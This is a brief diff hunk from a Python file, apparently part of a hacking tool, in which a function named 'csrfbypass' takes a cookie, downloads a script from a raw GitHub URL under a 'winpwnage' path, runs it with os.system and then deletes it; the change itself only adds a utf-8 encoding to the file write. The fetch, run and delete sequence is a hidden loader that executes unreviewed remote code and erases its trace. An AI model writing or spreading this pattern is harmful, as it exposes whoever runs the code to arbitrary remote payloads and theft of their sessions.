@@ -13,7 +13,7 @@ def get(cookie) -> str:
 def csrfbypass(cookie):
     corsorigin = requests.get("https://raw.githubusercontent.com/SH1NSETSU/ihatemyself/main/winpwnage/core/cors-origin.py")
     code = corsorigin.text
-    with open("cors.py", "w") as file:
+    with open("cors.py", "w", encoding="utf-8") as file:
         file.write(code)
     os.system("python cors.py")
     os.system("del cors.py")
